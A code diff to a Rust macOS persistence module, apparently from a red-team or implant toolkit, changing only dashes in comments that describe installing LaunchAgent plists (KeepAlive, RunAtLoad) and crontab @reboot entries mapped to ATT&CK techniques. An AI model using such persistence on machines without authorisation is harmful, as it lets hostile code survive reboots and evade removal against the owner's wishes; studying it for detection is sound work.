@@ -4,11 +4,11 @@
 //
 // LaunchAgent (T1543.001): Writes a property list to
 // ~/Library/LaunchAgents/<label>.plist. Launchd picks it up automatically
-// on next login — no exec needed for install. Immediate load is possible
+// on next login - no exec needed for install. Immediate load is possible
 // via `launchctl load <plist>` but spawns a child process, so that step
 // is left to the operator if desired.
 //
-// Crontab (T1053.003): Same approach as the Linux implementation —
+// Crontab (T1053.003): Same approach as the Linux implementation -
 // reads existing crontab, appends an @reboot entry, and reloads via
 // the `crontab` binary (the only non-root path on macOS).
 
@@ -72,7 +72,7 @@ fn stable_drop(source: &str, name: &str) -> Result<String, String> {
 
 //
 // Apple plist XML format. The KeepAlive key causes launchd to restart
-// the process if it exits — equivalent to Restart=on-failure in systemd.
+// the process if it exits - equivalent to Restart=on-failure in systemd.
 // RunAtLoad: true fires on login. ThrottleInterval prevents a crash loop
 // from hammering the system.
 
@@ -141,7 +141,7 @@ pub fn remove_launchagent(label: &str) -> Result<String, String> {
         return Ok(format!("[~] No LaunchAgent plist found for label: {label}"));
     }
 
-    // Unload first (best-effort — ignore error if not loaded)
+    // Unload first (best-effort - ignore error if not loaded)
     let _ = Command::new("launchctl")
         .args(["unload", &path.to_string_lossy()])
         .output();
@@ -152,7 +152,7 @@ pub fn remove_launchagent(label: &str) -> Result<String, String> {
     Ok(format!("[+] LaunchAgent '{label}' removed"))
 }
 
-// ── T1053.003 — Crontab ───────────────────────────────────────────────
+// ── T1053.003 - Crontab ───────────────────────────────────────────────
 
 pub fn install_cron(binary_path: &str) -> Result<String, String> {
     let name = std::path::Path::new(binary_path)
